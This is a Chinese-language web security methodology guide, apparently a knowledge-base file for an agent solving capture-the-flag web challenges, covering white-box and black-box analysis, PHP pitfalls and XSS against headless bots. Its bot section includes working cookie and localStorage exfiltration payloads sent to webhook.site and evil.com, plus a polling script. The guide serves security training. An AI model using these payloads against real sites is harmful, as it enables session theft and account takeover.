# Web 安全分析方法论


## 1. 白盒分析流程（有源码）

白盒分析的核心是**从代码追踪用户输入的影响路径**。

### 1.1 信息收集顺序

```
1. 项目结构 → 理解整体架构
2. 依赖版本 → 已知 CVE 查询
3. 中间件/路由 → 请求处理链
4. 配置文件 → 安全机制和隐藏功能
5. 业务代码 → 具体漏洞点
6. 框架/运行时源码 → 实现细节差异（关键！）
```

**按技术栈的关注重点**：

| 技术栈 | 额外关注 |
|--------|---------|
| PHP | `php.ini` 配置（max_input_vars、display_errors、open_basedir）、`.htaccess`、输入过滤函数 |
| Node.js/Next.js | `node_modules/` 框架源码、middleware 链、构建产物（`.next/`） |
| Python/Django/Flask | `requirements.txt` 版本、DEBUG 模式、SECRET_KEY 泄露 |

### 1.2 源码审计优先级

| 优先级 | 文件类型 | 原因 |
|--------|---------|------|
| 🔴 高 | nginx.conf / .htaccess / Caddyfile | 反向代理配置常含缓存规则/访问控制 |
| 🔴 高 | Docker 配置（docker-compose.yml） | 容器间网络、端口映射、环境变量、内部域名 |
| 🔴 高 | middleware（Express/Next.js/Koa） | 请求拦截器可能修改请求/响应，引入注入点 |
| 🔴 高 | php.ini / .htaccess / 运行时配置 | PHP 配置直接影响安全行为（max_input_vars、display_errors） |
| 🟡 中 | 路由处理函数 | 业务逻辑漏洞 |
| 🟡 中 | 认证/授权代码 | 权限绕过 |
| 🟡 中 | Bot/爬虫代码 | Bot 行为决定了 XSS 的触发条件和 Cookie 可达性 |
| 🟢 低 | 前端代码 | 通常只影响用户体验，除非有 XSS |
| 🔴 高 | 框架/运行时源码（node_modules/vendor） | **复杂题目的突破往往在这里** |

### 1.3 框架/运行时源码审计方法

**什么时候需要读框架源码？**
- 应用代码分析完毕但无法解释某个行为
- 框架返回了非预期的响应头/行为
- 需要理解缓存/Vary/渲染逻辑的精确行为

**怎么读框架源码？**
1. 从应用代码中调用的框架 API 入手，追踪到框架内部
2. 用 grep 搜索关键词（如 header 名称、配置项名称）
3. 对比同一功能在不同文件中的实现（差异即漏洞候选）

**关注点**：
- 请求头解析逻辑（如 `=== '1'` vs `!== undefined`）
- Vary 头设置逻辑（哪些头被加入 Vary）
- 缓存控制逻辑（何时设置 Cache-Control）
- 响应头修改逻辑（CT 覆盖、CSP 设置）

### 1.4 PHP 应用分析方法

PHP 应用有特有的安全配置和行为，需要额外关注。

#### 1.4.1 关键 PHP 配置项

| 配置项 | 默认值 | 安全影响 |
|--------|--------|---------|
| `max_input_vars` | 1000 | 超过限制触发 WARNING → 可能导致 headers already sent → 安全头（CSP/HSTS）消失 |
| `display_errors` | 开发环境 On / 生产环境 Off | 错误输出到页面 → headers already sent / 信息泄露 |
| `open_basedir` | 无限制 | 限制 PHP 可访问的目录路径 |
| `upload_max_filesize` | 2M | 文件上传大小限制 |
| `post_max_size` | 8M | POST 数据大小限制 |
| `session.cookie_httponly` | Off | Cookie 是否可通过 JS 读取 |
| `session.cookie_samesite` | 无 | Cookie 跨站发送限制 |

#### 1.4.2 PHP 特有攻击面

| 攻击面 | 检查方法 | 典型漏洞 |
|--------|---------|---------|
| max_input_vars | 发送 >1000 个参数，观察响应是否缺少安全头 | 安全头绕过（详见 `$AGENT_DIR/knowledge-base/csp-bypass.md`） |
| display_errors | 触发 WARNING/NOTICE，观察是否输出到页面 | headers already sent → CSP 绕过 / 信息泄露 |
| 反序列化 | 搜索 `unserialize()` 调用 | 对象注入 / RCE |
| 文件包含 | 搜索 `include`/`require` 使用用户输入 | LFI/RFI |
| 危险函数 | 搜索 `exec`/`system`/`eval`/`assert` | 命令注入 / 代码注入 |
| 类型混淆 | PHP 弱类型比较（`==` vs `===`） | 认证绕过（如 `0 == "admin"` 为 true） |

#### 1.4.3 PHP 参数计数

PHP 的 `max_input_vars` 限制计算**所有来源**的输入变量：

```
总数 = GET 参数 + POST 参数 + Cookie 数
```

利用方法：在正常参数之后添加垃圾参数，使总数超过 1000。重要参数放在前面确保被正常解析。

### 1.5 Bot 类题目分析方法

CTF 中 Bot 类题目是非常常见的模式：Bot 用浏览器访问页面，带着包含 flag 的数据。目标是构造 XSS 在 Bot 的浏览器中执行，窃取数据。

**按 flag 存储位置分类**：

| 变体 | Flag 存储位置 | 攻击目标 | 识别信号 |
|------|-------------|---------|---------|
| Bot+Cookie | Cookie | XSS → `document.cookie` | Bot 代码中有 `setCookie` / Cookie 域设置 |
| Bot+localStorage | localStorage | XSS → `localStorage.getItem()` | 源码中用 localStorage 存储数据（无 Cookie 设置，数据存在浏览器本地） |
| Bot+DOM | 页面 DOM | XSS → 读取页面内容 | 需要登录后才能看到的页面中有 flag |
| Bot+Session | 服务端 Session | CSRF / Session Fixation | 非 XSS 类，flag 只在服务端 |

#### 1.5.1 识别 Bot 模式

| 信号 | 含义 |
|------|------|
| 存在 `/bot/visit` 类端点 | 可以让 Bot 访问指定 URL |
| Docker 配置中有 Bot 容器 | Bot 是独立的浏览器服务 |
| Bot 使用 Puppeteer/Playwright | 真实浏览器，支持 JS 执行 |
| Cookie 域设置为内部域名 | Cookie 只在内部网络域名下发送 |

#### 1.5.2 Bot 类题目分析流程

```
1. 确定 Bot 行为
   ├── Bot 访问什么 URL？（内部域名 vs 外部域名）
   ├── Bot 的 Cookie 域是什么？（决定了 XSS 能否读到 flag）
   ├── Bot 是否等待页面加载完成？（影响 XSS 执行时机）
   └── Bot 的浏览器有什么限制？（User-Agent、超时时间）

2. 确定攻击面
   ├── 哪些页面 Bot 会访问？（需要找到存储型注入点）
   ├── 注入的 payload 在什么上下文渲染？（HTML/JS/属性/Markdown）
   └── 是否有 CSP/XSS 过滤阻止 payload 执行？

3. 确定外泄方式
   ├── 目标环境是否有外网？（Docker 隔离可能无外网）
   ├── 有外网 → webhook.site / 攻击者服务器
   ├── 无外网 → 缓存中缓存 / DNS exfiltration
   └── Cookie 是否有 httpOnly？（httpOnly 则 document.cookie 读不到）
```

#### 1.5.3 Bot URL 关键注意事项

**内部域名 vs 外部域名**：Docker 环境中 Bot 通常通过内部网络（如 `http://nginx`、`http://app`）访问，而不是外部地址。Cookie 的域也设置为内部域名。这意味着：

- Bot URL **必须使用内部域名**，Cookie 才会被发送
- 如果 Bot URL 用外部地址（如 `http://46.62.153.171:6767`），Cookie 不会被发送，`document.cookie` 为空
- 查看 docker-compose.yml 中的服务名和网络配置来确定内部域名

#### 1.5.4 Bot 时间线分析

当 Bot 的行为是"先访问用户 URL，后保存 flag"时，恶意 JS 需要"活着"等到 flag 被写入：

```
Bot 时间线：
1. Bot 访问攻击者 URL（触发 XSS）
2. Bot 继续浏览其他页面 / 等待页面加载完成
3. Bot 在某个时刻保存 flag（写 Cookie/localStorage/DOM）
4. Bot 关闭页面

攻击者的 JS 需要在步骤 1-4 之间"存活"并窃取 flag。
```

**轮询机制**（适用于 flag 写入时机不确定的场景）：

```javascript
// 简化轮询模板（Cookie 变体）
const poll = setInterval(() => {
  const flag = document.cookie;  // 或 localStorage.getItem('flag')
  if (flag) {
    clearInterval(poll);
    fetch('https://webhook.site/?c=' + encodeURIComponent(flag));
  }
}, 500);  // 每 500ms 检查一次
```

> 完整的攻击编排模板（含 iframe 逃逸、localStorage 轮询、自动外泄），见 `$AGENT_DIR/knowledge-base/attack-orchestration.md` §3.3。

#### 1.5.5 Bot 时间差利用（popup 存活模式）

当 Bot 的行为是"先访问攻击者 URL（firstPage），后在新页面（secondPage）中写入 flag"时：

```
关键行为：
  firstPage.close() 只关闭 firstPage 本身
  firstPage 通过 window.open() 打开的 popup 不会关闭
  popup 会继续存活直到 browser.close()
```

**利用条件**：
1. 攻击者代码在 popup 中运行（popup 的 origin 与 flag 同源）
2. popup 使用轮询等待 flag 写入 localStorage
3. flag 写入时间在 popup 存活窗口内

**适用场景**：
- Bot+localStorage：flag 在 secondPage 中保存到 localStorage
- Bot+DOM：flag 在 secondPage 中出现在页面上

> 详细的攻击编排模式见 `$AGENT_DIR/knowledge-base/attack-orchestration.md`

#### 1.5.6 常见数据外泄方式

**Cookie 外泄**：

| 方式 | Payload | 受限条件 |
|------|---------|---------|
| `<img>` onerror | `<img src=x onerror="this.src='https://webhook/?c='+document.cookie">` | CSP `img-src` |
| fetch/XMLHttpRequest | `fetch('https://webhook/?c='+document.cookie)` | CSP `connect-src` |
| location 跳转 | `location.href='https://webhook/?c='+document.cookie` | CSP `navigate-to`（很少设置） |
| WebSocket | `new WebSocket('wss://webhook/?c='+document.cookie)` | CSP `connect-src` |
| DNS | `new Image().src='http://'+document.cookie.length+'.evil.com'` | 基本无限制（逐字符外泄） |

**localStorage 窃取**：

| 方式 | Payload | 说明 |
|------|---------|------|
| 直接读取 | `fetch('https://webhook/?d='+localStorage.getItem('flag'))` | 需要知道 key 名 |
| 全量导出 | `fetch('https://webhook/?d='+JSON.stringify(localStorage))` | 导出所有键值对 |
| 轮询等待 | 见 1.5.4 轮询机制 | flag 写入时机不确定时使用 |

---

## 2. 黑盒分析流程（无源码）

黑盒分析的核心是**通过观察行为推断内部实现**。

### 2.1 探测流程

```
1. HTTP 基础探测
   ├── curl -v URL → 响应头分析
   ├── 多 Method 测试（GET/POST/PUT/OPTIONS）
   └── 多路径探测（/robots.txt / /.well-known/ /api/）

2. 框架指纹识别
   ├── 响应头（X-Powered-By / Server / Set-Cookie 名称）
   ├── HTML 特征（meta 标签 / 特有 class / 内联脚本模式）
   ├── 路径特征（/_next/ → Next.js, /wp-admin/ → WordPress）
   └── JS 文件特征（chunk 文件名模式 / buildId）

3. 版本推断
   ├── 直接：X-Powered-By 头
   ├── 间接：buildId + main-app chunk 路径 → 确认 App Router 模式
   └── 注意：有些框架不在响应中暴露精确版本号

4. 缓存机制探测
   ├── 发两个相同请求 → 对比响应（X-Cache: MISS → HIT）
   ├── 测试不同路径的缓存行为
   ├── 分析 Vary 头的内容
   └── 测试缓存键的组成（Host/AE/自定义头）
```

### 2.2 黑盒下的攻击面枚举

| 枚举方向 | 方法 | 工具 |
|---------|------|------|
| 路径发现 | 爬虫 + 常见路径字典 | curl / gobuster / ffuf |
| 参数发现 | HTML 表单 / JS API 调用 | 浏览器 DevTools / curl |
| 子域名 | DNS 枚举 / 证书透明度 | subfinder / crt.sh |
| 技术栈 | 响应头 + 行为特征 | whatweb / wappalyzer |

---

## 3. 攻击链构造方法

Web 安全分析不是找单个漏洞，而是构造**攻击链**——多个小漏洞/配置问题组合利用。

### 3.1 攻击链构造步骤

```
1. 明确目标（CTF: 拿 flag / 渗透: 拿权限）
2. 列出所有可控输入点
3. 对每个输入点，追踪它能影响什么（响应内容/缓存/数据库/文件系统）
4. 找出输入影响到"其他用户可见内容"的路径
5. 构造利用链：输入 → 中间影响 → 最终目标
6. 验证每一步都成立（假设必须测试）
```

### 3.2 常见攻击链模式

| 模式 | 组成 | 典型场景 |
|------|------|---------|
| 缓存投毒 + XSS | HTTP 头注入 → 缓存 → 其他用户执行 XSS | 有反向代理缓存 + 反射点 |
| SSRF + 内网访问 | 参数控制 → 访问内网服务 → 读取敏感数据 | 有 URL 参数 + 内网服务 |
| SQL 注入 + 认证绕过 | SQLi → 绕过登录 → 管理员功能 | 登录表单 + SQL 查询 |
| 文件上传 + RCE | 上传恶意文件 → 服务器执行 → 拿 shell | 文件上传功能 + 可执行目录 |
| JWT 伪造 + 权限提升 | 算法混淆 → 伪造 token → 管理员权限 | JWT 认证 + 弱密钥 |
| Stored XSS + CSP bypass | 存储恶意内容 → 绕过 CSP → Bot/受害者触发 XSS | 有 Markdown/评论功能 + CSP + Bot/Cookie |
| 参数炸弹 + 安全头绕过 | 超量参数 → 触发服务器错误 → 安全头（CSP/HSTS）消失 | PHP 应用 + max_input_vars |

### 3.3 关键思维方式

**"如果我注入的内容能被缓存，其他用户会收到什么？"** — 这是缓存投毒的核心问题。

**"这个配置组合在一起会产生什么效果？"** — 单个组件可能安全，组合后可能有漏洞。

**"从攻击者视角看，用户的哪些输入能影响其他用户看到的内容？"** — 这是寻找攻击链的起点。

---

## 4. 漏洞验证原则

1. **假设必须测试** — 不要仅凭代码分析就下结论，实际发送请求验证
2. **分步验证** — 攻击链的每一步都独立验证，不要一步跳到最终结果
3. **记录失败** — 失败的尝试和成功的一样重要，避免重复
4. **最小化影响** — 验证 XSS 用 alert/document.cookie，不要做破坏性操作

---

## 5. 报告与文档

分析完成后，输出应包含：

1. **攻击链概述**（一图流：输入 → 中间步骤 → 目标）
2. **每一步的详细分析**（原理 + 验证方法 + 实际结果）
3. **失败方向记录**（尝试了什么、为什么失败、学到了什么）
4. **防御建议**（如何修复每个环节）
